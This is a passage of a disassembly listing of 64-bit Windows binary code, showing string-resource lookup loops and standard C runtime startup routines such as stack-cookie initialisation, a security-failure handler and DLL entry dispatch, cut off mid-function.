    69dc3236:	83 fb 02             	cmp    $0x2,%ebx
    69dc3239:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc323e:	0f 84 bc 00 00 00    	je     0x69dc3300
    69dc3244:	0f b7 08             	movzwl (%rax),%ecx
    69dc3247:	83 fb 03             	cmp    $0x3,%ebx
    69dc324a:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc324f:	0f 84 ab 00 00 00    	je     0x69dc3300
    69dc3255:	0f b7 08             	movzwl (%rax),%ecx
    69dc3258:	83 fb 04             	cmp    $0x4,%ebx
    69dc325b:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc3260:	0f 84 9a 00 00 00    	je     0x69dc3300
    69dc3266:	0f b7 08             	movzwl (%rax),%ecx
    69dc3269:	83 fb 05             	cmp    $0x5,%ebx
    69dc326c:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc3271:	0f 84 89 00 00 00    	je     0x69dc3300
    69dc3277:	0f b7 08             	movzwl (%rax),%ecx
    69dc327a:	83 fb 06             	cmp    $0x6,%ebx
    69dc327d:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc3282:	74 7c                	je     0x69dc3300
    69dc3284:	0f b7 08             	movzwl (%rax),%ecx
    69dc3287:	83 fb 07             	cmp    $0x7,%ebx
    69dc328a:	48 8d 4c 48 02       	lea    0x2(%rax,%rcx,2),%rcx
    69dc328f:	48 89 c8             	mov    %rcx,%rax
    69dc3292:	74 6c                	je     0x69dc3300
    69dc3294:	0f b7 01             	movzwl (%rcx),%eax
    69dc3297:	83 fb 08             	cmp    $0x8,%ebx
    69dc329a:	48 8d 44 41 02       	lea    0x2(%rcx,%rax,2),%rax
    69dc329f:	74 5f                	je     0x69dc3300
    69dc32a1:	0f b7 08             	movzwl (%rax),%ecx
    69dc32a4:	83 fb 09             	cmp    $0x9,%ebx
    69dc32a7:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc32ac:	74 52                	je     0x69dc3300
    69dc32ae:	0f b7 08             	movzwl (%rax),%ecx
    69dc32b1:	83 fb 0a             	cmp    $0xa,%ebx
    69dc32b4:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc32b9:	74 45                	je     0x69dc3300
    69dc32bb:	0f b7 08             	movzwl (%rax),%ecx
    69dc32be:	83 fb 0b             	cmp    $0xb,%ebx
    69dc32c1:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc32c6:	74 38                	je     0x69dc3300
    69dc32c8:	0f b7 08             	movzwl (%rax),%ecx
    69dc32cb:	83 fb 0c             	cmp    $0xc,%ebx
    69dc32ce:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc32d3:	74 2b                	je     0x69dc3300
    69dc32d5:	0f b7 08             	movzwl (%rax),%ecx
    69dc32d8:	83 fb 0d             	cmp    $0xd,%ebx
    69dc32db:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc32e0:	74 1e                	je     0x69dc3300
    69dc32e2:	0f b7 08             	movzwl (%rax),%ecx
    69dc32e5:	83 fb 0e             	cmp    $0xe,%ebx
    69dc32e8:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc32ed:	74 11                	je     0x69dc3300
    69dc32ef:	0f b7 10             	movzwl (%rax),%edx
    69dc32f2:	48 8d 44 50 02       	lea    0x2(%rax,%rdx,2),%rax
    69dc32f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc32fe:	00 00 
    69dc3300:	44 0f b7 00          	movzwl (%rax),%r8d
    69dc3304:	66 45 85 c0          	test   %r8w,%r8w
    69dc3308:	74 2b                	je     0x69dc3335
    69dc330a:	41 0f b7 d0          	movzwl %r8w,%edx
    69dc330e:	39 f2                	cmp    %esi,%edx
    69dc3310:	73 1e                	jae    0x69dc3330
    69dc3312:	42 c6 04 07 00       	movb   $0x0,(%rdi,%r8,1)
    69dc3317:	89 d6                	mov    %edx,%esi
    69dc3319:	48 8d 50 02          	lea    0x2(%rax),%rdx
    69dc331d:	48 89 f9             	mov    %rdi,%rcx
    69dc3320:	e8 eb 19 00 00       	call   0x69dc4d10
    69dc3325:	89 f0                	mov    %esi,%eax
    69dc3327:	48 83 c4 28          	add    $0x28,%rsp
    69dc332b:	5b                   	pop    %rbx
    69dc332c:	5e                   	pop    %rsi
    69dc332d:	5f                   	pop    %rdi
    69dc332e:	5d                   	pop    %rbp
    69dc332f:	c3                   	ret
    69dc3330:	41 89 f0             	mov    %esi,%r8d
    69dc3333:	eb e4                	jmp    0x69dc3319
    69dc3335:	b9 16 07 00 00       	mov    $0x716,%ecx
    69dc333a:	ff 15 54 90 00 00    	call   *0x9054(%rip)        # 0x69dcc394
    69dc3340:	31 f6                	xor    %esi,%esi
    69dc3342:	c6 07 00             	movb   $0x0,(%rdi)
    69dc3345:	89 f0                	mov    %esi,%eax
    69dc3347:	48 83 c4 28          	add    $0x28,%rsp
    69dc334b:	5b                   	pop    %rbx
    69dc334c:	5e                   	pop    %rsi
    69dc334d:	5f                   	pop    %rdi
    69dc334e:	5d                   	pop    %rbp
    69dc334f:	c3                   	ret
    69dc3350:	55                   	push   %rbp
    69dc3351:	57                   	push   %rdi
    69dc3352:	56                   	push   %rsi
    69dc3353:	53                   	push   %rbx
    69dc3354:	48 83 ec 28          	sub    $0x28,%rsp
    69dc3358:	44 89 ce             	mov    %r9d,%esi
    69dc335b:	48 89 cd             	mov    %rcx,%rbp
    69dc335e:	89 d3                	mov    %edx,%ebx
    69dc3360:	44 8b 4c 24 70       	mov    0x70(%rsp),%r9d
    69dc3365:	85 f6                	test   %esi,%esi
    69dc3367:	4c 89 c7             	mov    %r8,%rdi
    69dc336a:	75 14                	jne    0x69dc3380
    69dc336c:	89 f0                	mov    %esi,%eax
    69dc336e:	48 83 c4 28          	add    $0x28,%rsp
    69dc3372:	5b                   	pop    %rbx
    69dc3373:	5e                   	pop    %rsi
    69dc3374:	5f                   	pop    %rdi
    69dc3375:	5d                   	pop    %rbp
    69dc3376:	c3                   	ret
    69dc3377:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc337e:	00 00 
    69dc3380:	c1 ea 04             	shr    $0x4,%edx
    69dc3383:	45 0f b7 c9          	movzwl %r9w,%r9d
    69dc3387:	41 b8 06 00 00 00    	mov    $0x6,%r8d
    69dc338d:	83 c2 01             	add    $0x1,%edx
    69dc3390:	0f b7 d2             	movzwl %dx,%edx
    69dc3393:	e8 c8 fc ff ff       	call   0x69dc3060
    69dc3398:	48 85 c0             	test   %rax,%rax
    69dc339b:	0f 84 2a 01 00 00    	je     0x69dc34cb
    69dc33a1:	8b 00                	mov    (%rax),%eax
    69dc33a3:	48 03 45 08          	add    0x8(%rbp),%rax
    69dc33a7:	83 e3 0f             	and    $0xf,%ebx
    69dc33aa:	0f 84 d5 00 00 00    	je     0x69dc3485
    69dc33b0:	0f b7 08             	movzwl (%rax),%ecx
    69dc33b3:	83 fb 01             	cmp    $0x1,%ebx
    69dc33b6:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc33bb:	0f 84 c4 00 00 00    	je     0x69dc3485
    69dc33c1:	0f b7 08             	movzwl (%rax),%ecx
    69dc33c4:	83 fb 02             	cmp    $0x2,%ebx
    69dc33c7:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc33cc:	0f 84 b3 00 00 00    	je     0x69dc3485
    69dc33d2:	0f b7 08             	movzwl (%rax),%ecx
    69dc33d5:	83 fb 03             	cmp    $0x3,%ebx
    69dc33d8:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc33dd:	0f 84 a2 00 00 00    	je     0x69dc3485
    69dc33e3:	0f b7 08             	movzwl (%rax),%ecx
    69dc33e6:	83 fb 04             	cmp    $0x4,%ebx
    69dc33e9:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc33ee:	0f 84 91 00 00 00    	je     0x69dc3485
    69dc33f4:	0f b7 08             	movzwl (%rax),%ecx
    69dc33f7:	83 fb 05             	cmp    $0x5,%ebx
    69dc33fa:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc33ff:	0f 84 80 00 00 00    	je     0x69dc3485
    69dc3405:	0f b7 08             	movzwl (%rax),%ecx
    69dc3408:	83 fb 06             	cmp    $0x6,%ebx
    69dc340b:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc3410:	74 73                	je     0x69dc3485
    69dc3412:	0f b7 08             	movzwl (%rax),%ecx
    69dc3415:	83 fb 07             	cmp    $0x7,%ebx
    69dc3418:	48 8d 4c 48 02       	lea    0x2(%rax,%rcx,2),%rcx
    69dc341d:	48 89 c8             	mov    %rcx,%rax
    69dc3420:	74 63                	je     0x69dc3485
    69dc3422:	0f b7 01             	movzwl (%rcx),%eax
    69dc3425:	83 fb 08             	cmp    $0x8,%ebx
    69dc3428:	48 8d 44 41 02       	lea    0x2(%rcx,%rax,2),%rax
    69dc342d:	74 56                	je     0x69dc3485
    69dc342f:	0f b7 08             	movzwl (%rax),%ecx
    69dc3432:	83 fb 09             	cmp    $0x9,%ebx
    69dc3435:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc343a:	74 49                	je     0x69dc3485
    69dc343c:	0f b7 08             	movzwl (%rax),%ecx
    69dc343f:	83 fb 0a             	cmp    $0xa,%ebx
    69dc3442:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc3447:	74 3c                	je     0x69dc3485
    69dc3449:	0f b7 08             	movzwl (%rax),%ecx
    69dc344c:	83 fb 0b             	cmp    $0xb,%ebx
    69dc344f:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc3454:	74 2f                	je     0x69dc3485
    69dc3456:	0f b7 08             	movzwl (%rax),%ecx
    69dc3459:	83 fb 0c             	cmp    $0xc,%ebx
    69dc345c:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc3461:	74 22                	je     0x69dc3485
    69dc3463:	0f b7 08             	movzwl (%rax),%ecx
    69dc3466:	83 fb 0d             	cmp    $0xd,%ebx
    69dc3469:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc346e:	74 15                	je     0x69dc3485
    69dc3470:	0f b7 08             	movzwl (%rax),%ecx
    69dc3473:	83 fb 0e             	cmp    $0xe,%ebx
    69dc3476:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc347b:	74 08                	je     0x69dc3485
    69dc347d:	0f b7 10             	movzwl (%rax),%edx
    69dc3480:	48 8d 44 50 02       	lea    0x2(%rax,%rdx,2),%rax
    69dc3485:	44 0f b7 00          	movzwl (%rax),%r8d
    69dc3489:	66 45 85 c0          	test   %r8w,%r8w
    69dc348d:	74 31                	je     0x69dc34c0
    69dc348f:	41 0f b7 d0          	movzwl %r8w,%edx
    69dc3493:	39 f2                	cmp    %esi,%edx
    69dc3495:	73 1e                	jae    0x69dc34b5
    69dc3497:	42 c6 04 07 00       	movb   $0x0,(%rdi,%r8,1)
    69dc349c:	89 d6                	mov    %edx,%esi
    69dc349e:	48 8d 50 02          	lea    0x2(%rax),%rdx
    69dc34a2:	48 89 f9             	mov    %rdi,%rcx
    69dc34a5:	e8 66 18 00 00       	call   0x69dc4d10
    69dc34aa:	89 f0                	mov    %esi,%eax
    69dc34ac:	48 83 c4 28          	add    $0x28,%rsp
    69dc34b0:	5b                   	pop    %rbx
    69dc34b1:	5e                   	pop    %rsi
    69dc34b2:	5f                   	pop    %rdi
    69dc34b3:	5d                   	pop    %rbp
    69dc34b4:	c3                   	ret
    69dc34b5:	41 89 f0             	mov    %esi,%r8d
    69dc34b8:	eb e4                	jmp    0x69dc349e
    69dc34ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc34c0:	b9 16 07 00 00       	mov    $0x716,%ecx
    69dc34c5:	ff 15 c9 8e 00 00    	call   *0x8ec9(%rip)        # 0x69dcc394
    69dc34cb:	31 f6                	xor    %esi,%esi
    69dc34cd:	c6 07 00             	movb   $0x0,(%rdi)
    69dc34d0:	89 f0                	mov    %esi,%eax
    69dc34d2:	48 83 c4 28          	add    $0x28,%rsp
    69dc34d6:	5b                   	pop    %rbx
    69dc34d7:	5e                   	pop    %rsi
    69dc34d8:	5f                   	pop    %rdi
    69dc34d9:	5d                   	pop    %rbp
    69dc34da:	c3                   	ret
    69dc34db:	90                   	nop
    69dc34dc:	90                   	nop
    69dc34dd:	90                   	nop
    69dc34de:	90                   	nop
    69dc34df:	90                   	nop
    69dc34e0:	48 83 ec 28          	sub    $0x28,%rsp
    69dc34e4:	48 8b 05 15 2b 00 00 	mov    0x2b15(%rip),%rax        # 0x69dc6000
    69dc34eb:	48 8b 00             	mov    (%rax),%rax
    69dc34ee:	48 85 c0             	test   %rax,%rax
    69dc34f1:	74 1d                	je     0x69dc3510
    69dc34f3:	ff d0                	call   *%rax
    69dc34f5:	48 8b 05 04 2b 00 00 	mov    0x2b04(%rip),%rax        # 0x69dc6000
    69dc34fc:	48 8d 50 08          	lea    0x8(%rax),%rdx
    69dc3500:	48 8b 40 08          	mov    0x8(%rax),%rax
    69dc3504:	48 89 15 f5 2a 00 00 	mov    %rdx,0x2af5(%rip)        # 0x69dc6000
    69dc350b:	48 85 c0             	test   %rax,%rax
    69dc350e:	75 e3                	jne    0x69dc34f3
    69dc3510:	48 83 c4 28          	add    $0x28,%rsp
    69dc3514:	c3                   	ret
    69dc3515:	90                   	nop
    69dc3516:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc351d:	00 00 00 
    69dc3520:	56                   	push   %rsi
    69dc3521:	53                   	push   %rbx
    69dc3522:	48 83 ec 28          	sub    $0x28,%rsp
    69dc3526:	48 8b 0d 83 3e 00 00 	mov    0x3e83(%rip),%rcx        # 0x69dc73b0
    69dc352d:	48 8b 11             	mov    (%rcx),%rdx
    69dc3530:	83 fa ff             	cmp    $0xffffffff,%edx
    69dc3533:	89 d0                	mov    %edx,%eax
    69dc3535:	74 39                	je     0x69dc3570
    69dc3537:	85 c0                	test   %eax,%eax
    69dc3539:	74 20                	je     0x69dc355b
    69dc353b:	89 c2                	mov    %eax,%edx
    69dc353d:	83 e8 01             	sub    $0x1,%eax
    69dc3540:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
    69dc3544:	48 29 c2             	sub    %rax,%rdx
    69dc3547:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
    69dc354c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc3550:	ff 13                	call   *(%rbx)
    69dc3552:	48 83 eb 08          	sub    $0x8,%rbx
    69dc3556:	48 39 f3             	cmp    %rsi,%rbx
    69dc3559:	75 f5                	jne    0x69dc3550
    69dc355b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x69dc34e0
    69dc3562:	48 83 c4 28          	add    $0x28,%rsp
    69dc3566:	5b                   	pop    %rbx
    69dc3567:	5e                   	pop    %rsi
    69dc3568:	e9 13 de ff ff       	jmp    0x69dc1380
    69dc356d:	0f 1f 00             	nopl   (%rax)
    69dc3570:	31 c0                	xor    %eax,%eax
    69dc3572:	eb 02                	jmp    0x69dc3576
    69dc3574:	89 d0                	mov    %edx,%eax
    69dc3576:	44 8d 40 01          	lea    0x1(%rax),%r8d
    69dc357a:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
    69dc357f:	4c 89 c2             	mov    %r8,%rdx
    69dc3582:	75 f0                	jne    0x69dc3574
    69dc3584:	eb b1                	jmp    0x69dc3537
    69dc3586:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc358d:	00 00 00 
    69dc3590:	8b 05 9a 6a 00 00    	mov    0x6a9a(%rip),%eax        # 0x69dca030
    69dc3596:	85 c0                	test   %eax,%eax
    69dc3598:	74 06                	je     0x69dc35a0
    69dc359a:	c3                   	ret
    69dc359b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc35a0:	c7 05 86 6a 00 00 01 	movl   $0x1,0x6a86(%rip)        # 0x69dca030
    69dc35a7:	00 00 00 
    69dc35aa:	e9 71 ff ff ff       	jmp    0x69dc3520
    69dc35af:	90                   	nop
    69dc35b0:	41 54                	push   %r12
    69dc35b2:	55                   	push   %rbp
    69dc35b3:	57                   	push   %rdi
    69dc35b4:	56                   	push   %rsi
    69dc35b5:	53                   	push   %rbx
    69dc35b6:	48 83 ec 30          	sub    $0x30,%rsp
    69dc35ba:	48 8b 1d 9f 2a 00 00 	mov    0x2a9f(%rip),%rbx        # 0x69dc6060
    69dc35c1:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
    69dc35c8:	2b 00 00 
    69dc35cb:	48 39 c3             	cmp    %rax,%rbx
    69dc35ce:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    69dc35d5:	00 00 
    69dc35d7:	74 17                	je     0x69dc35f0
    69dc35d9:	48 f7 d3             	not    %rbx
    69dc35dc:	48 89 1d 8d 2a 00 00 	mov    %rbx,0x2a8d(%rip)        # 0x69dc6070
    69dc35e3:	48 83 c4 30          	add    $0x30,%rsp
    69dc35e7:	5b                   	pop    %rbx
    69dc35e8:	5e                   	pop    %rsi
    69dc35e9:	5f                   	pop    %rdi
    69dc35ea:	5d                   	pop    %rbp
    69dc35eb:	41 5c                	pop    %r12
    69dc35ed:	c3                   	ret
    69dc35ee:	66 90                	xchg   %ax,%ax
    69dc35f0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69dc35f5:	ff 15 21 8d 00 00    	call   *0x8d21(%rip)        # 0x69dcc31c
    69dc35fb:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
    69dc3600:	ff 15 e6 8c 00 00    	call   *0x8ce6(%rip)        # 0x69dcc2ec
    69dc3606:	41 89 c4             	mov    %eax,%r12d
    69dc3609:	ff 15 e5 8c 00 00    	call   *0x8ce5(%rip)        # 0x69dcc2f4
    69dc360f:	89 c5                	mov    %eax,%ebp
    69dc3611:	ff 15 15 8d 00 00    	call   *0x8d15(%rip)        # 0x69dcc32c
    69dc3617:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    69dc361c:	89 c7                	mov    %eax,%edi
    69dc361e:	ff 15 40 8d 00 00    	call   *0x8d40(%rip)        # 0x69dcc364
    69dc3624:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
    69dc3629:	44 89 e0             	mov    %r12d,%eax
    69dc362c:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
    69dc3633:	ff 00 00 
    69dc3636:	48 31 f0             	xor    %rsi,%rax
    69dc3639:	89 ee                	mov    %ebp,%esi
    69dc363b:	48 31 c6             	xor    %rax,%rsi
    69dc363e:	89 f8                	mov    %edi,%eax
    69dc3640:	48 31 f0             	xor    %rsi,%rax
    69dc3643:	48 21 d0             	and    %rdx,%rax
    69dc3646:	48 39 d8             	cmp    %rbx,%rax
    69dc3649:	74 25                	je     0x69dc3670
    69dc364b:	48 89 c2             	mov    %rax,%rdx
    69dc364e:	48 f7 d2             	not    %rdx
    69dc3651:	48 89 05 08 2a 00 00 	mov    %rax,0x2a08(%rip)        # 0x69dc6060
    69dc3658:	48 89 15 11 2a 00 00 	mov    %rdx,0x2a11(%rip)        # 0x69dc6070
    69dc365f:	48 83 c4 30          	add    $0x30,%rsp
    69dc3663:	5b                   	pop    %rbx
    69dc3664:	5e                   	pop    %rsi
    69dc3665:	5f                   	pop    %rdi
    69dc3666:	5d                   	pop    %rbp
    69dc3667:	41 5c                	pop    %r12
    69dc3669:	c3                   	ret
    69dc366a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc3670:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
    69dc3677:	d4 ff ff 
    69dc367a:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
    69dc3681:	2b 00 00 
    69dc3684:	eb cb                	jmp    0x69dc3651
    69dc3686:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc368d:	00 00 00 
    69dc3690:	55                   	push   %rbp
    69dc3691:	56                   	push   %rsi
    69dc3692:	53                   	push   %rbx
    69dc3693:	48 89 e5             	mov    %rsp,%rbp
    69dc3696:	48 83 ec 70          	sub    $0x70,%rsp
    69dc369a:	48 89 ce             	mov    %rcx,%rsi
    69dc369d:	48 8d 0d 9c 69 00 00 	lea    0x699c(%rip),%rcx        # 0x69dca040
    69dc36a4:	ff 15 d2 8c 00 00    	call   *0x8cd2(%rip)        # 0x69dcc37c
    69dc36aa:	48 8b 1d 87 6a 00 00 	mov    0x6a87(%rip),%rbx        # 0x69dca138
    69dc36b1:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
    69dc36b5:	45 31 c0             	xor    %r8d,%r8d
    69dc36b8:	48 89 d9             	mov    %rbx,%rcx
    69dc36bb:	ff 15 c3 8c 00 00    	call   *0x8cc3(%rip)        # 0x69dcc384
    69dc36c1:	48 85 c0             	test   %rax,%rax
    69dc36c4:	0f 84 a3 00 00 00    	je     0x69dc376d
    69dc36ca:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
    69dc36ce:	49 89 c1             	mov    %rax,%r9
    69dc36d1:	49 89 d8             	mov    %rbx,%r8
    69dc36d4:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    69dc36db:	00 00 
    69dc36dd:	48 8d 0d 5c 69 00 00 	lea    0x695c(%rip),%rcx        # 0x69dca040
    69dc36e4:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
    69dc36e9:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    69dc36ed:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
    69dc36f2:	31 c9                	xor    %ecx,%ecx
    69dc36f4:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    69dc36f9:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    69dc36fd:	ff 15 89 8c 00 00    	call   *0x8c89(%rip)        # 0x69dcc38c
    69dc3703:	48 8b 05 2e 6a 00 00 	mov    0x6a2e(%rip),%rax        # 0x69dca138
    69dc370a:	31 c9                	xor    %ecx,%ecx
    69dc370c:	48 89 35 ad 69 00 00 	mov    %rsi,0x69ad(%rip)        # 0x69dca0c0
    69dc3713:	48 89 05 16 6e 00 00 	mov    %rax,0x6e16(%rip)        # 0x69dca530
    69dc371a:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
    69dc3721:	00 00 00 
    69dc3724:	48 89 05 f5 6d 00 00 	mov    %rax,0x6df5(%rip)        # 0x69dca520
    69dc372b:	48 8b 05 2e 29 00 00 	mov    0x292e(%rip),%rax        # 0x69dc6060
    69dc3732:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    69dc3736:	48 8b 05 33 29 00 00 	mov    0x2933(%rip),%rax        # 0x69dc6070
    69dc373d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    69dc3741:	ff 15 55 8c 00 00    	call   *0x8c55(%rip)        # 0x69dcc39c
    69dc3747:	48 8d 0d 32 39 00 00 	lea    0x3932(%rip),%rcx        # 0x69dc7080
    69dc374e:	ff 15 68 8c 00 00    	call   *0x8c68(%rip)        # 0x69dcc3bc
    69dc3754:	ff 15 8a 8b 00 00    	call   *0x8b8a(%rip)        # 0x69dcc2e4
    69dc375a:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
    69dc375f:	48 89 c1             	mov    %rax,%rcx
    69dc3762:	ff 15 44 8c 00 00    	call   *0x8c44(%rip)        # 0x69dcc3ac
    69dc3768:	e8 5b 16 00 00       	call   0x69dc4dc8
    69dc376d:	48 8b 45 18          	mov    0x18(%rbp),%rax
    69dc3771:	48 89 05 c0 69 00 00 	mov    %rax,0x69c0(%rip)        # 0x69dca138
    69dc3778:	48 8d 45 08          	lea    0x8(%rbp),%rax
    69dc377c:	48 89 05 55 69 00 00 	mov    %rax,0x6955(%rip)        # 0x69dca0d8
    69dc3783:	e9 7b ff ff ff       	jmp    0x69dc3703
    69dc3788:	90                   	nop
    69dc3789:	90                   	nop
    69dc378a:	90                   	nop
    69dc378b:	90                   	nop
    69dc378c:	90                   	nop
    69dc378d:	90                   	nop
    69dc378e:	90                   	nop
    69dc378f:	90                   	nop
    69dc3790:	48 83 ec 28          	sub    $0x28,%rsp
    69dc3794:	83 fa 03             	cmp    $0x3,%edx
    69dc3797:	74 17                	je     0x69dc37b0
    69dc3799:	85 d2                	test   %edx,%edx
    69dc379b:	74 13                	je     0x69dc37b0
    69dc379d:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc37a2:	48 83 c4 28          	add    $0x28,%rsp
    69dc37a6:	c3                   	ret
    69dc37a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc37ae:	00 00 
    69dc37b0:	e8 5b 0b 00 00       	call   0x69dc4310
    69dc37b5:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc37ba:	48 83 c4 28          	add    $0x28,%rsp
    69dc37be:	c3                   	ret
    69dc37bf:	90                   	nop
    69dc37c0:	56                   	push   %rsi
    69dc37c1:	53                   	push   %rbx
    69dc37c2:	48 83 ec 28          	sub    $0x28,%rsp
    69dc37c6:	48 8b 05 d3 3b 00 00 	mov    0x3bd3(%rip),%rax        # 0x69dc73a0
    69dc37cd:	83 38 02             	cmpl   $0x2,(%rax)
    69dc37d0:	74 06                	je     0x69dc37d8
    69dc37d2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
    69dc37d8:	83 fa 02             	cmp    $0x2,%edx
    69dc37db:	74 13                	je     0x69dc37f0
    69dc37dd:	83 fa 01             	cmp    $0x1,%edx
    69dc37e0:	74 40                	je     0x69dc3822
    69dc37e2:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc37e7:	48 83 c4 28          	add    $0x28,%rsp
    69dc37eb:	5b                   	pop    %rbx
    69dc37ec:	5e                   	pop    %rsi
    69dc37ed:	c3                   	ret
    69dc37ee:	66 90                	xchg   %ax,%ax
    69dc37f0:	48 8d 1d 59 98 00 00 	lea    0x9859(%rip),%rbx        # 0x69dcd050
    69dc37f7:	48 8d 35 52 98 00 00 	lea    0x9852(%rip),%rsi        # 0x69dcd050
    69dc37fe:	48 39 de             	cmp    %rbx,%rsi
    69dc3801:	74 df                	je     0x69dc37e2
    69dc3803:	48 8b 03             	mov    (%rbx),%rax
    69dc3806:	48 85 c0             	test   %rax,%rax
    69dc3809:	74 02                	je     0x69dc380d
    69dc380b:	ff d0                	call   *%rax
    69dc380d:	48 83 c3 08          	add    $0x8,%rbx
    69dc3811:	48 39 de             	cmp    %rbx,%rsi
    69dc3814:	75 ed                	jne    0x69dc3803
    69dc3816:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc381b:	48 83 c4 28          	add    $0x28,%rsp
    69dc381f:	5b                   	pop    %rbx
    69dc3820:	5e                   	pop    %rsi
    69dc3821:	c3                   	ret
    69dc3822:	e8 e9 0a 00 00       	call   0x69dc4310
    69dc3827:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc382c:	48 83 c4 28          	add    $0x28,%rsp
    69dc3830:	5b                   	pop    %rbx
    69dc3831:	5e                   	pop    %rsi
    69dc3832:	c3                   	ret
    69dc3833:	0f 1f 00             	nopl   (%rax)
    69dc3836:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc383d:	00 00 00 
    69dc3840:	31 c0                	xor    %eax,%eax
    69dc3842:	c3                   	ret
    69dc3843:	90                   	nop
    69dc3844:	90                   	nop
    69dc3845:	90                   	nop
    69dc3846:	90                   	nop
    69dc3847:	90                   	nop
    69dc3848:	90                   	nop
    69dc3849:	90                   	nop
    69dc384a:	90                   	nop
    69dc384b:	90                   	nop
    69dc384c:	90                   	nop
    69dc384d:	90                   	nop
    69dc384e:	90                   	nop
    69dc384f:	90                   	nop
    69dc3850:	48 89 c8             	mov    %rcx,%rax
    69dc3853:	c3                   	ret
    69dc3854:	66 90                	xchg   %ax,%ax
    69dc3856:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc385d:	00 00 00 
    69dc3860:	48 89 c8             	mov    %rcx,%rax
    69dc3863:	c3                   	ret
    69dc3864:	90                   	nop
    69dc3865:	90                   	nop
    69dc3866:	90                   	nop
    69dc3867:	90                   	nop
    69dc3868:	90                   	nop
    69dc3869:	90                   	nop
    69dc386a:	90                   	nop
    69dc386b:	90                   	nop
    69dc386c:	90                   	nop
    69dc386d:	90                   	nop
    69dc386e:	90                   	nop
    69dc386f:	90                   	nop
    69dc3870:	41 54                	push   %r12
    69dc3872:	55                   	push   %rbp
    69dc3873:	57                   	push   %rdi
    69dc3874:	56                   	push   %rsi
    69dc3875:	53                   	push   %rbx
    69dc3876:	48 83 ec 50          	sub    $0x50,%rsp
    69dc387a:	48 63 35 63 6d 00 00 	movslq 0x6d63(%rip),%rsi        # 0x69dca5e4
    69dc3881:	85 f6                	test   %esi,%esi
    69dc3883:	48 89 cb             	mov    %rcx,%rbx
    69dc3886:	48 89 d5             	mov    %rdx,%rbp
    69dc3889:	4c 89 c7             	mov    %r8,%rdi
    69dc388c:	0f 8e 66 01 00 00    	jle    0x69dc39f8
    69dc3892:	48 8b 05 4f 6d 00 00 	mov    0x6d4f(%rip),%rax        # 0x69dca5e8
    69dc3899:	31 c9                	xor    %ecx,%ecx
